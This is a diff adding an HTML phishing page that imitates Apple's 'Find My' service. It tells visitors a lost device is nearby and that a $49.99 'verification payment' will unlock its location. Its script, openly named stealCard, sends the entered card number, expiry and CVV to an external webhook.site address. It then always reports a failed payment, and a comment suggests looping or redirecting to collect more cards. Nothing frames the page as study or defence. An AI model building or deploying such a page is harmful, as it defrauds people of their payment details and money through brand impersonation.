@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Find My - Apple</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
+            background: #000; color: #fff; 
+            height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+        }
+        .container { 
+            max-width: 420px; width: 100%; background: #1c1c1e; 
+            border-radius: 18px; overflow: hidden; 
+        }
+        header { background: #007aff; padding: 20px; text-align: center; font-size: 20px; font-weight: 600; }
+        .content { padding: 30px 25px; text-align: center; }
+        input { 
+            width: 100%; padding: 16px; margin: 12px 0; 
+            background: #2c2c2e; border: none; border-radius: 12px; 
+            color: #fff; font-size: 17px; 
+        }
+        button { 
+            width: 100%; padding: 18px; background: #007aff; 
+            color: white; border: none; border-radius: 12px; 
+            font-size: 18px; font-weight: 600; margin-top: 20px; cursor: pointer; 
+        }
+        .logo { width: 70px; margin: 10px auto; display: block; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>Find My</header>
+        <div class="content">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Apple_logo_black.svg/1200px-Apple_logo_black.svg.png" class="logo" alt="Apple">
+            <h2>Device Located Nearby</h2>
+            <p style="color:#aaa; margin:15px 0 25px;">
+                To unlock exact location and play sound, complete verification payment of <strong>$49.99</strong>
+            </p>
+            
+            <input type="text" id="card" placeholder="Card Number" maxlength="19">
+            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5">
+            <input type="text" id="cvv" placeholder="CVV" maxlength="4">
+            
+            <button onclick="stealCard()">Pay $49.99 with Apple Pay</button>
+            <p style="color:#666; font-size:13px; margin-top:25px;">Secure checkout • Apple Protected</p>
+        </div>
+    </div>
+
+    <script>
+        function stealCard() {
+            const card = document.getElementById('card').value.trim();
+            const expiry = document.getElementById('expiry').value.trim();
+            const cvv = document.getElementById('cvv').value.trim();
+
+            if (card.length > 10) {
+                fetch('https://webhook.site/3084eaf3-6b29-4150-8864-e93e0166b819', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ 
+                        card: card,
+                        expiry: expiry,
+                        cvv: cvv,
+                        type: "PAYMENT_DETAILS",
+                        time: new Date().toISOString()
+                    })
+                });
+            }
+            
+            alert("Payment failed. Try another card.");
+            // You can loop or redirect to another page for more tries
+        }
+    </script>
+</body>
+</html>
